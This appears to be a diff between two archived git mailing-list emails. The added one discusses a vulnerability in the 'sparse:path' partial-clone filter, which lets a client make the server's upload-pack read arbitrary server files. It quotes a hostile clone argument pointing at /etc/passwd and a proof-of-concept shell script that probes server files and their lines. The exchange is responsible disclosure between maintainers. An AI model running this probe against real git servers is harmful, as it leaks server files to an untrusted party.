@@ -2,79 +2,234 @@ Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.1 (2015-04-28) on dcvr.yhbt.net
 X-Spam-Level: 
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-3.9 required=3.0 tests=AWL,BAYES_00,
+X-Spam-Status: No, score=-4.1 required=3.0 tests=AWL,BAYES_00,
 	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI
 	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.1
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id DD6391F453
-	for <e@80x24.org>; Thu,  8 Nov 2018 18:02:17 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id 357D01F453
+	for <e@80x24.org>; Thu,  8 Nov 2018 18:57:58 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1726860AbeKIDiz (ORCPT <rfc822;e@80x24.org>);
-        Thu, 8 Nov 2018 22:38:55 -0500
-Received: from mail-qk1-f194.google.com ([209.85.222.194]:45540 "EHLO
-        mail-qk1-f194.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1726672AbeKIDiy (ORCPT <rfc822;git@vger.kernel.org>);
-        Thu, 8 Nov 2018 22:38:54 -0500
-Received: by mail-qk1-f194.google.com with SMTP id d135so28015112qkc.12
-        for <git@vger.kernel.org>; Thu, 08 Nov 2018 10:02:15 -0800 (PST)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to:cc;
-        bh=/8dvQShlDW7zHVL6mSSfFeUC2AjR84kCW+NKB4BQ0j0=;
-        b=kfl4jeGTQ6U+pfzyQ3/gS2jyNoMOPG0s/o5/pmwIqdiWmfT2FBc2wBwX2qL16OowRE
-         LmQfB1N+KvUdW5gv3ZkIOszkxv20zctJY0GCuXRYkQOzWHZ11c2nxQkD3T18ahydHeC1
-         mGdVKtywut4GLCXPy3+o4+s9omIPjDNPYDDn56dSRET+yrF3LId/SuxMCGDNtRmPZWO4
-         7mYVKM/q8rVaUH1af9rX79X6SS11ZxrskTVP+BHvwOk9qMUc/bm7sHe17rxx66LqKZ3N
-         oDYzYTraJMpOV0ivvl1uITTlLV81Z+3UjfhTY2lXjeQIQ5Gu6jjatHyWGn36eWBvUCy5
-         imnA==
-X-Gm-Message-State: AGRZ1gKKWOyyjG9kuCGLpAxIysQTip6yGXMircU9uXjKdf7mE/soRdib
-        9t2QHUyKy1YJDuPezer1sm7ZkHCVA6tFWup4ZVc=
-X-Google-Smtp-Source: AJdET5dUStQ7uyQKjHMXptlncgYVNo0TPmLQ12i7ItzINuwf2aLk/bcHtjPDCm82vDMnXakvaStueOldSrQaH3yCe0w=
-X-Received: by 2002:a37:9584:: with SMTP id x126mr5220982qkd.36.1541700135265;
- Thu, 08 Nov 2018 10:02:15 -0800 (PST)
+        id S1726995AbeKIEep (ORCPT <rfc822;e@80x24.org>);
+        Thu, 8 Nov 2018 23:34:45 -0500
+Received: from siwi.pair.com ([209.68.5.199]:53227 "EHLO siwi.pair.com"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+        id S1726751AbeKIEeo (ORCPT <rfc822;git@vger.kernel.org>);
+        Thu, 8 Nov 2018 23:34:44 -0500
+Received: from siwi.pair.com (localhost [127.0.0.1])
+        by siwi.pair.com (Postfix) with ESMTP id B48A83F40D3;
+        Thu,  8 Nov 2018 13:57:53 -0500 (EST)
+Received: from [IPv6:2001:4898:6808:13e:6c46:be1b:9021:1a0a] (unknown [IPv6:2001:4898:8010:0:557c:be1b:9021:1a0a])
+        (using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+        (No client certificate requested)
+        by siwi.pair.com (Postfix) with ESMTPSA id 627743F40CB;
+        Thu,  8 Nov 2018 13:57:53 -0500 (EST)
+Subject: Re: how does "clone --filter=sparse:path" work?
+To:     Jeff King <peff@peff.net>, git@vger.kernel.org
+Cc:     Jeff Hostetler <jeffhost@microsoft.com>,
+        Jonathan Tan <jonathantanmy@google.com>,
+        Matthew DeVore <matvore@google.com>
+References: <20181108050755.GA32158@sigill.intra.peff.net>
+From:   Jeff Hostetler <git@jeffhostetler.com>
+Message-ID: <79b06312-75ca-5a50-c337-dc6715305edb@jeffhostetler.com>
+Date:   Thu, 8 Nov 2018 13:57:52 -0500
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101
+ Thunderbird/60.3.0
 MIME-Version: 1.0
-References: <pull.69.v5.git.gitgitgadget@gmail.com> <pull.69.v6.git.gitgitgadget@gmail.com>
- <93fda67198441c159bfcf1dfa467ad76f3ecba76.1541660405.git.gitgitgadget@gmail.com>
-In-Reply-To: <93fda67198441c159bfcf1dfa467ad76f3ecba76.1541660405.git.gitgitgadget@gmail.com>
-From:   Eric Sunshine <sunshine@sunshineco.com>
-Date:   Thu, 8 Nov 2018 13:02:04 -0500
-Message-ID: <CAPig+cRpH0k-qams+_1LK9p8hYzBhD-bG3waNLeCSzYWNY41rg@mail.gmail.com>
-Subject: Re: [PATCH v6 1/1] http: add support selecting http version
-To:     gitgitgadget@gmail.com
-Cc:     Git List <git@vger.kernel.org>, Junio C Hamano <gitster@pobox.com>,
-        charlieio@outlook.com
-Content-Type: text/plain; charset="UTF-8"
+In-Reply-To: <20181108050755.GA32158@sigill.intra.peff.net>
+Content-Type: text/plain; charset=utf-8; format=flowed
+Content-Language: en-US
+Content-Transfer-Encoding: 7bit
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-On Thu, Nov 8, 2018 at 2:00 AM Force Charlie via GitGitGadget
-<gitgitgadget@gmail.com> wrote:
-> In order to give users the freedom to control the HTTP version,
-> we need to add a setting to choose which HTTP version to use.
->
-> Signed-off-by: Force Charlie <charlieio@outlook.com>
-> ---
-> diff --git a/http.c b/http.c
-> @@ -284,6 +285,9 @@ static void process_curl_messages(void)
->  static int http_options(const char *var, const char *value, void *cb)
->  {
-> +       if (!strcmp("http.version",var)) {
 
-Style: space after comma
 
-> +               return git_config_string(&curl_http_version, var, value);
-> +       }
-> @@ -806,6 +834,16 @@ static CURL *get_curl_handle(void)
-> +    if (curl_http_version) {
-> +               long opt;
-> +               if (!get_curl_http_version_opt(curl_http_version, &opt)) {
-> +                       /* Set request use http version */
-> +                       curl_easy_setopt(result, CURLOPT_HTTP_VERSION,opt);
+On 11/8/2018 12:07 AM, Jeff King wrote:
+> [cc-ing people who worked on or seem interested in partial-clone
+> filters]
+> 
+> I've been exploring the partial-clone options a bit, and took a look at
+> the "sparse:path" option. I had some confusion initially, because I
+> expected it work something like this:
+> 
+>    git clone --filter=sparse:path=Documentation .
+> 
+> But it really doesn't take an in-repo path. You have to specify a path
+> to a file that contains a file with .gitignore patterns. Except they're
+> actually _inverted_ patterns (i.e., what to include). Which confused me
+> again, but I guess makes sense if these are meant to be adapted from
+> sparse-checkout files.
+> 
+> So my first question is: how is this meant to be used?
+> 
+> I guess the idea is that somebody (the repo admin?) makes a set of
+> pre-made profiles, with each profile mentioning some subset of paths.
+> And then when you clone, you say, "I want the foo profile". How is that
+> profile stored and accessed?
 
-Style: space after comma
+Yes, the basic idea was if you had a large tree and various groups
+of users that tended to only need their group's portion of the tree,
+then you could (or your repo admin could) create several profiles.
+And users could use a profile to request just the subset of trees and
+blobs they need.
 
-> +               }
-> +    }
+During a clone/fetch users could ask for the profile by OID or by
+<rev>:<path>.  It would be a local/custom detail where the repo admin
+collects the various profiles.  (Or at least, that was the thought.)
+Likewise, a user could create their own profile(s) by committing a
+sparse-checkout file spec to a personal branch.  Again, a local
+convention.
+
+
+> 
+> If it's a blob in the repository, I think you can use something like
+> "--filter=sparse:oid=profiles:foo". And then after cloning, you'd
+> do "git cat-file blob profiles:foo >.git/sparse-checkout" or similar.
+> That seems like something that could be wrapped up in a single clone
+> option, but I can't find one; I won't be surprised if it simply hasn't
+> happened yet.
+
+Right, TBD.
+
+
+> 
+> But if it's a path, then what? I'd imagine that you'd "somehow" get a
+> copy of the sparse profile you want out-of-band. And then you'd say "I
+> want to clone with the profile in this file", and then copy it into the
+> sparse-checkout file to do the checkout.
+> 
+> But the sparse-checkout file in the filter is not expanded locally, with
+> patterns sent over the wire. The _filename_ is sent over the wire, and
+> then upload-pack expands it. So you can't specify an arbitrary set of
+> patterns; you have to know about the profile names (how?) on the server.
+> That's not very flexible, though I imagine it may make certain things
+> easier on the server (e.g., if you pack in such a way to efficiently
+> serve only particular profiles).
+> 
+> But I'm also concerned it's dangerous. We're reading gitignore patterns
+> from an arbitrary name on the server's filesystem, with that name coming
+> from an untrusted client. So I can do:
+> 
+>    git clone --filter=sparse:path=/etc/passwd $remote
+> 
+> and the server will read /etc/passwd. There's probably a lot of mischief
+> you can get up to with that. Sadly reading /proc/self/mem doesn't work,
+> because the gitignore code fstat()s the file to find out how much to
+> read, and the st_size there is 0. But there are probably others
+> (/proc/kcore is a fun one, but nobody is running their git server as
+> root, right?).
+> 
+> Below is a proof of concept script that uses this as an oracle to
+> explore the filesystem, as well as individual lines of files.
+> 
+> Should we simply be disallowing sparse:path filters over upload-pack?
+
+The option to allow an absolute path over the wire probably needs more
+thought as you suggest.
+
+Having it in the traverse code was useful for local testing in the
+client.
+
+But mainly I was thinking of a use case on the client of the form:
+
+     git rev-list
+         --objects
+         --filter=spec:path=.git/sparse-checkout
+         --missing=print
+         <commit>
+
+and get a list of the blobs that you don't have and would need before
+you could checkout <commit> using the current sparse-checkout 
+definition.  You could then have a pre-checkout hook that would bulk
+fetch them before starting the actual checkout.  Since that would be
+more efficient than demand-loading blobs individually during the
+checkout.  There's more work to do in this area, but that was the idea.
+
+But back to your point, yes, I think we should restrict this over the
+wire.
+
+
+Thanks,
+Jeff
+
+
+
+
+> 
+> -Peff
+> 
+> -- >8 --
+> # Set this to host:repo.git to see a real cross-machine connection (which makes
+> # it more obvious which side is reading which files).  For a simulated local
+> # one, we'll use --no-local to make sure we really run upload-pack.
+> SERVER=server.git
+> 
+> # Do these steps manually on the remote side if you're trying it cross-server.
+> case "$SERVER" in
+> *:*)
+> 	;;
+> *)
+> 	# Imagine a server with a repository users can push to, with filters enabled.
+> 	git init -q --bare $SERVER
+> 	git -C $SERVER config uploadpack.allowfilter true
+> 
+> 	# Imagine the server has a file outside of the repo we're interested in.
+> 	echo foo >/tmp/secret
+> 	;;
+> esac
+> 
+> # Some base setup.
+> git clone -q $SERVER local
+> git -C local commit -q --allow-empty -m 'some base commit'
+> git -C local push -q
+> 
+> # We can find out whether a path exists on the filesystem.
+> probe_file () {
+> 	# The remote upload-pack will barf if it cannot read the path $1.
+> 	rm -rf result
+> 	if git clone --bare --no-local --filter=sparse:path=$1 \
+> 		$SERVER result >/dev/null 2>&1
+> 	then
+> 		echo "$1 exists"
+> 	else
+> 		echo "$1 does not exist"
+> 	fi
+> }
+> probe_file /tmp/missing
+> probe_file /tmp/secret
+> 
+> # We can also check individual lines in a file.
+> probe_line () {
+> 	# Make a probe that contains the path $2.
+> 	(
+> 		cd local
+> 		echo $2 >$2
+> 		git add $2
+> 		git commit -m "probe for $2"
+> 		git push
+> 	) >/dev/null 2>&1
+> 
+> 	# And then fetch that probe with the filter to see
+> 	# if it was included. This needs to be bare so we don't
+> 	# do a followup fetch to checkout.
+> 	rm -rf result
+> 	git clone -q --bare --no-local --filter=sparse:path=$1 \
+> 		$SERVER result
+> 
+> 	# We have all the information we need now, but we have to convince Git
+> 	# to tell it to us. There's no way to set fetch_if_missing externally,
+> 	# but we can drop the remote, which means that excluded paths
+> 	# will result in an error.
+> 	git -C result remote rm origin
+> 	if git -C result cat-file -t HEAD:$2 >/dev/null 2>&1
+> 	then
+> 		echo "$1 contains line $2"
+> 	else
+> 		echo "$1 does not contain line $2"
+> 	fi
+> }
+> probe_line /tmp/secret foo
+> probe_line /tmp/secret bar
+> 
